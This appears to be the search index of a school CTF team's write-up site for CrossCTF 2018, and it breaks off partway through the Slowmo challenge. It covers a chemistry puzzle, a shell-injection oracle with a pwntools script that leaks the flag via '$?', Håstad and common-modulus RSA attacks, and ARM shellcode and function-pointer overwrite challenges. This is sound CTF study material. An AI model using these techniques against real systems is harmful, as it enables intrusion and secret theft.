{
    "docs": [
        {
            "location": "/README/", 
            "text": "Hey there!\n\n\nWe're OSI Layer 8, a CTF Team from NUS High School. Here you'll find a collection of writeups for challenges our team solved.", 
            "title": "Home"
        }, 
        {
            "location": "/README/#hey-there", 
            "text": "We're OSI Layer 8, a CTF Team from NUS High School. Here you'll find a collection of writeups for challenges our team solved.", 
            "title": "Hey there!"
        }, 
        {
            "location": "/crossctf-quals2018/README/", 
            "text": "CrossCTF Quals 2018\n\n\nPwn\n\n\nEasynote\n\n\nbinary\n\n\nexploit\n\n\nEven Flow\n\n\nwriteup\n\n\nbinary\n\n\nexploit\n\n\nImpossible Shellcoding\n\n\nbinary\n\n\nexploit\n\n\nQuiet Moon\n\n\nbinary\n\n\nexploit\n\n\nReal Baby Pwnable\n\n\nbinary\n\n\nexploit\n\n\nSkipping Rope\n\n\nbinary\n\n\nexploit\n\n\nReverse Engineering\n\n\nGoGoGo\n\n\nManual Labour\n\n\nMisc\n\n\nCYOA\n\n\nwriteup\n\n\nCrypto\n\n\nLossy ORacle\n\n\nscript\n\n\nexploit\n\n\nflag\n\n\nBabyRSA\n\n\nwriteup\n\n\nexploit\n\n\nBabyRSA2\n\n\nwriteup\n\n\nexploit\n\n\nWeb\n\n\nQuirkyScript 1\n\n\nQuirkyScript 2\n\n\nQuirkyScript 3\n\n\nQuirkyScript 4\n\n\nQuirkyScript 5\n\n\nBaby Web", 
            "title": "Overview"
        }, 
        {
            "location": "/crossctf-quals2018/README/#crossctf-quals-2018", 
            "text": "", 
            "title": "CrossCTF Quals 2018"
        }, 
        {
            "location": "/crossctf-quals2018/README/#pwn", 
            "text": "", 
            "title": "Pwn"
        }, 
        {
            "location": "/crossctf-quals2018/README/#easynote", 
            "text": "binary  exploit", 
            "title": "Easynote"
        }, 
        {
            "location": "/crossctf-quals2018/README/#even-flow", 
            "text": "writeup  binary  exploit", 
            "title": "Even Flow"
        }, 
        {
            "location": "/crossctf-quals2018/README/#impossible-shellcoding", 
            "text": "binary  exploit", 
            "title": "Impossible Shellcoding"
        }, 
        {
            "location": "/crossctf-quals2018/README/#quiet-moon", 
            "text": "binary  exploit", 
            "title": "Quiet Moon"
        }, 
        {
            "location": "/crossctf-quals2018/README/#real-baby-pwnable", 
            "text": "binary  exploit", 
            "title": "Real Baby Pwnable"
        }, 
        {
            "location": "/crossctf-quals2018/README/#skipping-rope", 
            "text": "binary  exploit", 
            "title": "Skipping Rope"
        }, 
        {
            "location": "/crossctf-quals2018/README/#reverse-engineering", 
            "text": "", 
            "title": "Reverse Engineering"
        }, 
        {
            "location": "/crossctf-quals2018/README/#gogogo", 
            "text": "Manual Labour", 
            "title": "GoGoGo"
        }, 
        {
            "location": "/crossctf-quals2018/README/#misc", 
            "text": "", 
            "title": "Misc"
        }, 
        {
            "location": "/crossctf-quals2018/README/#cyoa", 
            "text": "writeup", 
            "title": "CYOA"
        }, 
        {
            "location": "/crossctf-quals2018/README/#crypto", 
            "text": "", 
            "title": "Crypto"
        }, 
        {
            "location": "/crossctf-quals2018/README/#lossy-oracle", 
            "text": "script  exploit  flag", 
            "title": "Lossy ORacle"
        }, 
        {
            "location": "/crossctf-quals2018/README/#babyrsa", 
            "text": "writeup  exploit", 
            "title": "BabyRSA"
        }, 
        {
            "location": "/crossctf-quals2018/README/#babyrsa2", 
            "text": "writeup  exploit", 
            "title": "BabyRSA2"
        }, 
        {
            "location": "/crossctf-quals2018/README/#web", 
            "text": "", 
            "title": "Web"
        }, 
        {
            "location": "/crossctf-quals2018/README/#quirkyscript-1", 
            "text": "", 
            "title": "QuirkyScript 1"
        }, 
        {
            "location": "/crossctf-quals2018/README/#quirkyscript-2", 
            "text": "", 
            "title": "QuirkyScript 2"
        }, 
        {
            "location": "/crossctf-quals2018/README/#quirkyscript-3", 
            "text": "", 
            "title": "QuirkyScript 3"
        }, 
        {
            "location": "/crossctf-quals2018/README/#quirkyscript-4", 
            "text": "", 
            "title": "QuirkyScript 4"
        }, 
        {
            "location": "/crossctf-quals2018/README/#quirkyscript-5", 
            "text": "", 
            "title": "QuirkyScript 5"
        }, 
        {
            "location": "/crossctf-quals2018/README/#baby-web", 
            "text": "", 
            "title": "Baby Web"
        }, 
        {
            "location": "/crossctf-quals2018/CYOA/README/", 
            "text": "Choose Your Own Adventure - CrossCTF Quals 2018 (misc)\n\n\n\n\nMaybe your question was too long. You \nreduced\n the length of your question and asked the oracle again: \"Where's the flag?\"\n\n\nAs expected, she had no \nreaction\n again. You sigh... maybe the \nsolution\n really was in there after all. You close your eyes and started willing yourself back into the enemy's base...\n\n\nNon-standard flag format: \n[A-Z0-9]+\n\n\n\n\nChallenge\n\n\nWe are given the hints in this format:\n\n\n\n\n01 01 02, Score: 04\n\n\nYou contribute to the puddle of urine in the corner of this room.\n\n\nScribbled into the wall is the number 17.\n\n\nBelow in red, the number 0 was written.\n\n\nWhere would you like to move?\n\n\n6 -- Down\n\n\n9 -- Quit\n\n\n\n\n1-6 are used to navigate the location to collect all the \nhints\n.\n\n\nAnd we are also given 4 hints to solve the challenge:\n\n\n\n\nHint 1 for CYOA: len(flag) = 9 Think outside the box for this challenge. It's less of a ctf challenge and more of a misc puzzle tbh...\n\n\nThink about how the contents of each room relate to the coordinates and the score.\n\n\nSo now that you can match why each object is in a specific room (with a certain coordinate and score), perhaps think about the scribblings. What's the meaning behind the scribbles?\n\n\nYou are looking for a string of characters that leads to the final flag. Link each object in the rooms to the coordinates and figure out the overarching theme of the puzzle.\n\n\n\n\nAnd the words reduced, reaction and solution are italicized, suggesting the topic is chemistry.\n\n\nInterpreting the hints\n\n\nConsider the hint above, urea is one component of urine, with chemical formula CO(NH2)2 -\n C1O2N2H4, which corresponds to the coordinates(01 01 02) and the score(04). With this in mind we check all the other 19 hints and get all the \nchemicals\n.\n\n\nThe scribbles in the wall are also unique, ranging from 0 to 19, which suggests the chemicals can be sorted.\n\n\n\n\n\n\n\n\nScribble\n\n\nChemical\n\n\nRed no.\n\n\n\n\n\n\n\n\n\n\n0\n\n\nacetone\n\n\n1\n\n\n\n\n\n\n1\n\n\nacetic acid\n\n\n0\n\n\n\n\n\n\n2\n\n\npropene\n\n\n0\n\n\n\n\n\n\n3\n\n\nnitrous oxide\n\n\n6\n\n\n\n\n\n\n4\n\n\nacetic acid\n\n\n0\n\n\n\n\n\n\n5\n\n\nnitrogen\n\n\n1\n\n\n\n\n\n\n6\n\n\nacetone\n\n\n1\n\n\n\n\n\n\n7\n\n\nnitrogen\n\n\n1\n\n\n\n\n\n\n8\n\n\nozone\n\n\n3\n\n\n\n\n\n\n9\n\n\nnull\n\n\n0\n\n\n\n\n\n\n10\n\n\nnitrogen\n\n\n1\n\n\n\n\n\n\n11\n\n\nozone\n\n\n3\n\n\n\n\n\n\n12\n\n\nnull\n\n\n0\n\n\n\n\n\n\n13\n\n\nformaldehyde\n\n\n0\n\n\n\n\n\n\n14\n\n\nammonia\n\n\n3\n\n\n\n\n\n\n15\n\n\nwater\n\n\n4\n\n\n\n\n\n\n16\n\n\nmethane\n\n\n0\n\n\n\n\n\n\n17\n\n\nurea\n\n\n0\n\n\n\n\n\n\n18\n\n\nglycerol\n\n\n1\n\n\n\n\n\n\n19\n\n\nacetic acid\n\n\n0\n\n\n\n\n\n\n\n\nTo solve the challenge, we take the (Red no.)th element of the chemical's common name and list them out\n\n\ncapsaicin in formula\n\n\n\n\nFlag: C18H27NO3", 
            "title": "CYOA"
        }, 
        {
            "location": "/crossctf-quals2018/CYOA/README/#choose-your-own-adventure-crossctf-quals-2018-misc", 
            "text": "Maybe your question was too long. You  reduced  the length of your question and asked the oracle again: \"Where's the flag?\"  As expected, she had no  reaction  again. You sigh... maybe the  solution  really was in there after all. You close your eyes and started willing yourself back into the enemy's base...  Non-standard flag format:  [A-Z0-9]+", 
            "title": "Choose Your Own Adventure - CrossCTF Quals 2018 (misc)"
        }, 
        {
            "location": "/crossctf-quals2018/CYOA/README/#challenge", 
            "text": "We are given the hints in this format:   01 01 02, Score: 04  You contribute to the puddle of urine in the corner of this room.  Scribbled into the wall is the number 17.  Below in red, the number 0 was written.  Where would you like to move?  6 -- Down  9 -- Quit   1-6 are used to navigate the location to collect all the  hints .  And we are also given 4 hints to solve the challenge:   Hint 1 for CYOA: len(flag) = 9 Think outside the box for this challenge. It's less of a ctf challenge and more of a misc puzzle tbh...  Think about how the contents of each room relate to the coordinates and the score.  So now that you can match why each object is in a specific room (with a certain coordinate and score), perhaps think about the scribblings. What's the meaning behind the scribbles?  You are looking for a string of characters that leads to the final flag. Link each object in the rooms to the coordinates and figure out the overarching theme of the puzzle.   And the words reduced, reaction and solution are italicized, suggesting the topic is chemistry.", 
            "title": "Challenge"
        }, 
        {
            "location": "/crossctf-quals2018/CYOA/README/#interpreting-the-hints", 
            "text": "Consider the hint above, urea is one component of urine, with chemical formula CO(NH2)2 -  C1O2N2H4, which corresponds to the coordinates(01 01 02) and the score(04). With this in mind we check all the other 19 hints and get all the  chemicals .  The scribbles in the wall are also unique, ranging from 0 to 19, which suggests the chemicals can be sorted.     Scribble  Chemical  Red no.      0  acetone  1    1  acetic acid  0    2  propene  0    3  nitrous oxide  6    4  acetic acid  0    5  nitrogen  1    6  acetone  1    7  nitrogen  1    8  ozone  3    9  null  0    10  nitrogen  1    11  ozone  3    12  null  0    13  formaldehyde  0    14  ammonia  3    15  water  4    16  methane  0    17  urea  0    18  glycerol  1    19  acetic acid  0     To solve the challenge, we take the (Red no.)th element of the chemical's common name and list them out  capsaicin in formula   Flag: C18H27NO3", 
            "title": "Interpreting the hints"
        }, 
        {
            "location": "/crossctf-quals2018/pwn/evenflow/README/", 
            "text": "Even Flow - CrossCTF Quals 2018 (pwn)\n\n\n\n\nDo you like shell command injection?\n\n\nnc ctf.pwn.sg 1601\n\n\nCreator - amon (@nn_amon)\n\n\n\n\nChallenge\n\n\nWe are given a python script that is ran upon connection to the challenge server. Mainly, it reads in 2 strings.\n\n\nFirst, a string that is called \"flag\", and then another string consisting of only 2 bytes called \"shell\".\n\n\nsys.stdout.write(\nFlag: \n)\nsys.stdout.flush()\nflag = sys.stdin.readline().strip()\n\nsys.stdout.write(\nShell: \n)\nsys.stdout.flush()\nshell = sys.stdin.read(2)\n\n\n\n\nThe \"flag\" would be passed as an argument into the \nevenflow\n binary, while the \"shell\" is just being passed to \necho\n.\n\n\nos.system(\n./evenflow \n + flag + \n; echo \\\n + shell + \n\\\n);\n\n\n\n\nWe were also given the source of \nevenflow\n, which just reads the flag from a file, and performs \nstrcmp\n on the \"flag\" that we passed in and the actual flag.\n\n\nsize_t get_file_size(char * filename) {\n    struct stat st;\n    stat(filename, \nst);\n    return st.st_size;\n}\n\nint main(int argc, char ** argv) {\n    FILE * fd = fopen(\nflag\n, \nr\n);\n    size_t file_size = get_file_size(\nflag\n);\n    char * buffer = malloc(file_size);\n    fread(buffer, 1, file_size, fd);\n    return strcmp(buffer, argv[1]);\n}\n\n\n\n\nThe interesting part of this code is the last line,\n\n\nreturn strcmp(buffer, argv[1]);\n\n\n\n\nAccording to documentation, \nstrcmp\n will return a number that says how far the first differing character is away from each other.\n\n\nExploit\n\n\n$?\n\n\nIn a shell, \n$?\n contains the return value of the previous command. Since we are allowed to pass a string of 2 bytes to \necho\n, we can just send in \n$?\n for \"shell\".\n\n\nSo, we can call \necho $?\n which will give us the return value of \n./evenflow flag\n, which will let us know how far away is the first differing character from the actual flag. \n\n\nWith this information, we can keep \"correcting\" our flag until we get the actual flag.\n\n\nScript\n\n\nWe can write a script to automate this process.\n\n\nfrom pwn import *\n\ndef tryf(flag):\n    p = remote('ctf.pwn.sg', 1601)\n\n    p.sendlineafter('Flag: ', flag)\n    p.sendlineafter('Shell: ', '$?')\n\n    # returns the return value of evenflow\n    return int(p.recvline())\n\n# The Idea:\n# Basically, we compare the actual flag to \n0\n,\n# Then adjust it based on the output of strcmp (the exit code)\n# e.g. to \nC\n, then add a \n0\n =\n \nC0\n\n# and repeat till we get \n}\n, the end of the flag\n\ns = \n0\n\nwhile True:\n    i = tryf(s)\n\n    # adjust!\n    c = chr(ord('0')+i)\n    s = s[:-1] + c\n\n    if s[-1] == '}':\n        print(s)\n        break\n\n    s+='0'", 
            "title": "Even Flow"
        }, 
        {
            "location": "/crossctf-quals2018/pwn/evenflow/README/#even-flow-crossctf-quals-2018-pwn", 
            "text": "Do you like shell command injection?  nc ctf.pwn.sg 1601  Creator - amon (@nn_amon)", 
            "title": "Even Flow - CrossCTF Quals 2018 (pwn)"
        }, 
        {
            "location": "/crossctf-quals2018/pwn/evenflow/README/#challenge", 
            "text": "We are given a python script that is ran upon connection to the challenge server. Mainly, it reads in 2 strings.  First, a string that is called \"flag\", and then another string consisting of only 2 bytes called \"shell\".  sys.stdout.write( Flag:  )\nsys.stdout.flush()\nflag = sys.stdin.readline().strip()\n\nsys.stdout.write( Shell:  )\nsys.stdout.flush()\nshell = sys.stdin.read(2)  The \"flag\" would be passed as an argument into the  evenflow  binary, while the \"shell\" is just being passed to  echo .  os.system( ./evenflow   + flag +  ; echo \\  + shell +  \\ );  We were also given the source of  evenflow , which just reads the flag from a file, and performs  strcmp  on the \"flag\" that we passed in and the actual flag.  size_t get_file_size(char * filename) {\n    struct stat st;\n    stat(filename,  st);\n    return st.st_size;\n}\n\nint main(int argc, char ** argv) {\n    FILE * fd = fopen( flag ,  r );\n    size_t file_size = get_file_size( flag );\n    char * buffer = malloc(file_size);\n    fread(buffer, 1, file_size, fd);\n    return strcmp(buffer, argv[1]);\n}  The interesting part of this code is the last line,  return strcmp(buffer, argv[1]);  According to documentation,  strcmp  will return a number that says how far the first differing character is away from each other.", 
            "title": "Challenge"
        }, 
        {
            "location": "/crossctf-quals2018/pwn/evenflow/README/#exploit", 
            "text": "", 
            "title": "Exploit"
        }, 
        {
            "location": "/crossctf-quals2018/pwn/evenflow/README/#_1", 
            "text": "In a shell,  $?  contains the return value of the previous command. Since we are allowed to pass a string of 2 bytes to  echo , we can just send in  $?  for \"shell\".  So, we can call  echo $?  which will give us the return value of  ./evenflow flag , which will let us know how far away is the first differing character from the actual flag.   With this information, we can keep \"correcting\" our flag until we get the actual flag.", 
            "title": "$?"
        }, 
        {
            "location": "/crossctf-quals2018/pwn/evenflow/README/#script", 
            "text": "We can write a script to automate this process.  from pwn import *\n\ndef tryf(flag):\n    p = remote('ctf.pwn.sg', 1601)\n\n    p.sendlineafter('Flag: ', flag)\n    p.sendlineafter('Shell: ', '$?')\n\n    # returns the return value of evenflow\n    return int(p.recvline())\n\n# The Idea:\n# Basically, we compare the actual flag to  0 ,\n# Then adjust it based on the output of strcmp (the exit code)\n# e.g. to  C , then add a  0  =   C0 \n# and repeat till we get  } , the end of the flag\n\ns =  0 \nwhile True:\n    i = tryf(s)\n\n    # adjust!\n    c = chr(ord('0')+i)\n    s = s[:-1] + c\n\n    if s[-1] == '}':\n        print(s)\n        break\n\n    s+='0'", 
            "title": "Script"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA/README/", 
            "text": "BabyRSA - CrossCTF Quals 2018 (crypto)\n\n\n\n\nEach time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all the values.\n\n\nout.txt\n.\n\n\n\n\nChallenge\n\n\nWe're give a list of RSA n(modulus),e(exponent),c(ciphertext)\n\n\nWe notice that all the exponents are the same.\n\n\nVulnerability\n\n\nRSA Algorithm\n\n\n\n\nFirstly, 2 distinct primes are chosen, p and q\n\n\nCalculate the modulus with n=pq\n\n\nCalculate \u03bb(n)=lcm(p-1,q-1)\n\n\nChoose the exponent e such that 1\ne\n\u03bb(n) and e and n are coprime\n\n\nCalculate d=e-1 (mod \u03bb(n))\n\n\nCalculate the ciphertext c with c=m\ne\n (mod n)\nDecryption is done with m=c\nd\n (mod n)\n\n\n\n\nCommon prime factor attack\n\n\nIf the random prime generator is flawed, it could produce 2 prime numbers that are the same, and the message can easily be found by calculating p and q, however, every single pair of primes is coprime.\n\n\nLow exponent attack\n\n\nAnother option is if c=m\ne\n, we can just calculate m=c\n1/e\n and we're done. This would require the exponent to be much smaller compared to the modulus. \n\n\nSince we're given many pairs of c,n,e, we can use the Chinese Remainder Theorem to calculate m\ne\n (mod n1*n2*n3...), then we can take the 257th root. \nThis assumes message remains the same\n\n\nChinese remainder theorem\n\n\nLet N be the product of all the modulus\n\n\nLet N\ni\n=N/n\ni\n\n\nFind integers M\ni\n and m\ni\n such that M\ni\nN\ni\n+m\ni\nn\ni\n=1.\n\n\nNow calculate C=\u03a3c\ni\nM\ni\nM\ni\n mod N\n\n\nC=c\ni\n mod n\ni\n for all i\n\n\nN is now much larger than 257, so we can just take C\n1/e\n and we're done.\n\n\nexploit\n\n\n\n\nFlag:\ncrossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}", 
            "title": "BabyRSA"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#babyrsa-crossctf-quals-2018-crypto", 
            "text": "Each time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all the values.  out.txt .", 
            "title": "BabyRSA - CrossCTF Quals 2018 (crypto)"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#challenge", 
            "text": "We're give a list of RSA n(modulus),e(exponent),c(ciphertext)  We notice that all the exponents are the same.", 
            "title": "Challenge"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#vulnerability", 
            "text": "", 
            "title": "Vulnerability"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#rsa-algorithm", 
            "text": "Firstly, 2 distinct primes are chosen, p and q  Calculate the modulus with n=pq  Calculate \u03bb(n)=lcm(p-1,q-1)  Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime  Calculate d=e-1 (mod \u03bb(n))  Calculate the ciphertext c with c=m e  (mod n)\nDecryption is done with m=c d  (mod n)", 
            "title": "RSA Algorithm"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#common-prime-factor-attack", 
            "text": "If the random prime generator is flawed, it could produce 2 prime numbers that are the same, and the message can easily be found by calculating p and q, however, every single pair of primes is coprime.", 
            "title": "Common prime factor attack"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#low-exponent-attack", 
            "text": "Another option is if c=m e , we can just calculate m=c 1/e  and we're done. This would require the exponent to be much smaller compared to the modulus.   Since we're given many pairs of c,n,e, we can use the Chinese Remainder Theorem to calculate m e  (mod n1*n2*n3...), then we can take the 257th root.  This assumes message remains the same", 
            "title": "Low exponent attack"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#chinese-remainder-theorem", 
            "text": "Let N be the product of all the modulus  Let N i =N/n i  Find integers M i  and m i  such that M i N i +m i n i =1.  Now calculate C=\u03a3c i M i M i  mod N  C=c i  mod n i  for all i  N is now much larger than 257, so we can just take C 1/e  and we're done.  exploit   Flag: crossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}", 
            "title": "Chinese remainder theorem"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/", 
            "text": "BabyRSA2 - CrossCTF Quals 2018 (crypto)\n\n\n\n\nEach time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all the values... AGAIN!\n\n\nout.txt\n.\n\n\n\n\nChallenge\n\n\nWe're give a list of RSA n(modulus),e(exponent),c(ciphertext)\n\n\nWe notice that all the modulus are the same.\n\n\nVulnerability\n\n\nRSA Algorithm\n\n\n\n\nFirstly, 2 distinct primes are chosen, p and q\n\n\nCalculate the modulus with n=pq\n\n\nCalculate \u03bb(n)=lcm(p-1,q-1)\n\n\nChoose the exponent e such that 1\ne\n\u03bb(n) and e and n are coprime\n\n\nCalculate d=e-1 (mod \u03bb(n))\n\n\nCalculate the ciphertext c with c=m\ne\n (mod n)\nDecryption is done with m=c\nd\n (mod n)\n\n\n\n\nCommon modulus attack\n\n\nSince pq mod n=(p mod n)(q mod n)mod n and m\na\n m\nb\n=m\nab\n, if we can find numbers x\n1\nx\n2\n... such that \u03a3x\ni\ne\ni\n=1, then we can calculate m\n1\n, assuming all the messages are the same.\n\n\nB\u00e9zout's identity states that if x and y are coprime, then integers a,b exists such that ax+by=1, however, all our exponents share common prime factors, even any 4 exponents share a common factor. However, all 5 exponents do not share a common factor, thus, it is possible to find x\n1\nx\n2\n... such that \u03a3x\ni\ne\ni\n=1.\n\n\nWe can use the extended Euclidean algorithm, however, the numbers resulting from it could be pretty huge, so the equation is evaluated by Mathematica, giving us x=[3239,237,735,556,-6676]. For negative numbers, we can calculate the inverse modulo pretty quickly, and evaluating \u03a0m\nx\ni\ne\ni\n (mod n) gives us the flag.\n\n\nexploit\n\n\n\n\nFlag:\ncrossctf{RSA_Challenges_Are_Too_Easy}", 
            "title": "BabyRSA 2"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#babyrsa2-crossctf-quals-2018-crypto", 
            "text": "Each time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all the values... AGAIN!  out.txt .", 
            "title": "BabyRSA2 - CrossCTF Quals 2018 (crypto)"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#challenge", 
            "text": "We're give a list of RSA n(modulus),e(exponent),c(ciphertext)  We notice that all the modulus are the same.", 
            "title": "Challenge"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#vulnerability", 
            "text": "", 
            "title": "Vulnerability"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#rsa-algorithm", 
            "text": "Firstly, 2 distinct primes are chosen, p and q  Calculate the modulus with n=pq  Calculate \u03bb(n)=lcm(p-1,q-1)  Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime  Calculate d=e-1 (mod \u03bb(n))  Calculate the ciphertext c with c=m e  (mod n)\nDecryption is done with m=c d  (mod n)", 
            "title": "RSA Algorithm"
        }, 
        {
            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#common-modulus-attack", 
            "text": "Since pq mod n=(p mod n)(q mod n)mod n and m a  m b =m ab , if we can find numbers x 1 x 2 ... such that \u03a3x i e i =1, then we can calculate m 1 , assuming all the messages are the same.  B\u00e9zout's identity states that if x and y are coprime, then integers a,b exists such that ax+by=1, however, all our exponents share common prime factors, even any 4 exponents share a common factor. However, all 5 exponents do not share a common factor, thus, it is possible to find x 1 x 2 ... such that \u03a3x i e i =1.  We can use the extended Euclidean algorithm, however, the numbers resulting from it could be pretty huge, so the equation is evaluated by Mathematica, giving us x=[3239,237,735,556,-6676]. For negative numbers, we can calculate the inverse modulo pretty quickly, and evaluating \u03a0m x i e i  (mod n) gives us the flag.  exploit   Flag: crossctf{RSA_Challenges_Are_Too_Easy}", 
            "title": "Common modulus attack"
        }, 
        {
            "location": "/crossctf-finals2018/README/", 
            "text": "CrossCTF Finals 2018\n\n\n\n\n\n\n\"That was some really intense score progression.\"\n- Ambrose\n\n\n\n\nOverview\n\n\nMkDocs sucks, but anyway see the sidebar on the left for the list of challenges", 
            "title": "Overview"
        }, 
        {
            "location": "/crossctf-finals2018/README/#crossctf-finals-2018", 
            "text": "\"That was some really intense score progression.\"\n- Ambrose", 
            "title": "CrossCTF Finals 2018"
        }, 
        {
            "location": "/crossctf-finals2018/README/#overview", 
            "text": "MkDocs sucks, but anyway see the sidebar on the left for the list of challenges", 
            "title": "Overview"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/ftlog/README/", 
            "text": "CrossCTF Finals 2018 : FTLOG (Pwn)\n\n\nFirst Blood by : OSI Layer 8\n\n\n\n\nhttps://youtu.be/RW2vXFLXtps\n\n\nnc ctf.pwn.sg 4004\n\n\nHint: The raspberry Pis might come in handy but you can look at using qemu too.\n\n\nCreator - amon (@nn_amon)\n\n\n\n\nStatic Analysis\n\n\nRunning \nfile ftlog\n gives:\n\n\nftlog: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=c3d8b29303d27686f7190bf2e3d88fc857517a3b, not stripped\n\n\n\n\nThe binary is ARM, so I expected it to be hard to run/debug the program locally. \nLuckily, pwntools can emulate other architectures using qemu\n, so at the very least we can run the challenge locally.\n\n\nThe code for the challenge is as follows:\n\n\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  void (__fastcall *v3)(int); // ST00_4\n  int v4; // r0\n\n  puts(\nart, argv, envp);\n  v3 = (void (__fastcall *)(int))malloc(512);\n  mprotect(v3, 512, 7);\n  v4 = read(0, v3, 512);\n  v3(v4);\n  return 0;\n}\n\n\n\n\nThe prints out some \nart\n, then allocates memory and marks it as \nexecutable (\nmprotect(v3, 512, 7)\n =\n \nmprotect(memory, memory_size, PROT_READ | PROT_WRITE | PROT_EXEC)\n). Then, it reads in some input to the memory and executes our input.\nIn other words, this is a simple shellcode challenge, but for ARM.\n\n\nSolution\n\n\nThe solution is to simply send in some ARM shellcode to spawn shell, then interact with it.\n\n\nSolution code in \nhere\n\n\nP.S. I still have no idea what the YouTube link is for", 
            "title": "FTLOG"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/ftlog/README/#crossctf-finals-2018-ftlog-pwn", 
            "text": "", 
            "title": "CrossCTF Finals 2018 : FTLOG (Pwn)"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/ftlog/README/#first-blood-by-osi-layer-8", 
            "text": "https://youtu.be/RW2vXFLXtps  nc ctf.pwn.sg 4004  Hint: The raspberry Pis might come in handy but you can look at using qemu too.  Creator - amon (@nn_amon)", 
            "title": "First Blood by : OSI Layer 8"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/ftlog/README/#static-analysis", 
            "text": "Running  file ftlog  gives:  ftlog: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=c3d8b29303d27686f7190bf2e3d88fc857517a3b, not stripped  The binary is ARM, so I expected it to be hard to run/debug the program locally.  Luckily, pwntools can emulate other architectures using qemu , so at the very least we can run the challenge locally.  The code for the challenge is as follows:  int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  void (__fastcall *v3)(int); // ST00_4\n  int v4; // r0\n\n  puts( art, argv, envp);\n  v3 = (void (__fastcall *)(int))malloc(512);\n  mprotect(v3, 512, 7);\n  v4 = read(0, v3, 512);\n  v3(v4);\n  return 0;\n}  The prints out some  art , then allocates memory and marks it as \nexecutable ( mprotect(v3, 512, 7)  =   mprotect(memory, memory_size, PROT_READ | PROT_WRITE | PROT_EXEC) ). Then, it reads in some input to the memory and executes our input.\nIn other words, this is a simple shellcode challenge, but for ARM.", 
            "title": "Static Analysis"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/ftlog/README/#solution", 
            "text": "The solution is to simply send in some ARM shellcode to spawn shell, then interact with it.  Solution code in  here  P.S. I still have no idea what the YouTube link is for", 
            "title": "Solution"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/slowmo/README/", 
            "text": "CrossCTF Finals 2018 : Slowmo (Pwn)\n\n\nFirst Blood by : OSI Layer 8\n\n\n\n\nWhat is in this mysterious package?\n\n\nnc ctf.pwn.sg 4005\n\n\nCreator - amon (@nn_amon)\n\n\n\n\nStatic Analysis\n\n\nRun \nfile slowmo\n:\n\n\nslowmo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=0c6352b62e9c246c5530b20dc13a5d82c60619cc, stripped\n\n\n\n\nRunning IDA Pro on the binary, I got code that I originally thought was some sort of language-specific setup code, like Go's runtime initialization. I had no idea what to do, so I went to solve other challenges.\n\n\nMuch later into the competition, the source code was released:\n\n\n#include \nstdio.h\n\n#include \nstdlib.h\n\n#include \nunistd.h\n\n#include \nsys/mman.h\n\n\nint happy = 0;\n\nvoid (*indirection)();\n\nchar tape[256];\n\nvoid dis() {\n    system(\n/bin/date\n);\n}\n\nvoid dos() {\n    system(\n/bin/sh\n);\n}\n\nint main() {\n    indirection = dis;\n    char * ptr = tape + 128;\n    alarm(30);\n    char inst;\n    while (1) {\n        if (happy) {\n            for (int i = 0; i \n 256; i++) {\n                printf(\n/%02x\n, tape[i]);\n            }\n            printf(\n/\\n\n);\n        }\n        read(0, \ninst, 1);\n        switch (inst) {\n            case '\n':\n                ++ptr;\n                break;\n            case '\n':\n                --ptr;\n                break;\n            case '^':\n                *ptr += 1;\n                break;\n            case 'v':\n                *ptr -= 1;\n                break;\n            case '!':\n                indirection();\n                return 0;\n            case '`':\n                happy = 1;\n        }\n    }\n}\n\n\n\n\nI actually had this function in IDA's analysis, but I thought it was some junk:\n\n\nint __fastcall sub_105EC(int a1, int a2)\n{\n  unsigned int v2; // r0\n  int result; // r0\n  unsigned __int8 v4; // [sp+3h] [bp-11h]\n  _BYTE *v5; // [sp+4h] [bp-10h]\n  int v6; // [sp+8h] [bp-Ch]\n  int v7; // [sp+Ch] [bp-8h]\n\n  v7 = dword_97F8C;\n  dword_99EBC = (int (__fastcall *)(_DWORD))sub_105B4;\n  v5 = \nunk_99E3C;\n  sub_279F8(30, a2, (int)sub_105B4, \nunk_99E3C);\n  while ( 1 )\n  {\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        if ( dword_98EEC )\n        {\n          v6 = 0;\n          if ( v6 \n= 255 )\n            printf(\n/%02x\n, byte_99DBC[v6]);\n          sub_17E30();\n        }\n        v2 = sub_28620(0, \nv4, (void *)1, \nv4);\n        if ( v4 != '\n' )\n          break;\n        --v5;\n      }\n      if ( (signed int)v4 \n= 62 )\n        break;\n      switch ( v4 )\n      {\n        case 0x60u:\n          dword_98EEC = 1;\n          break;\n        case 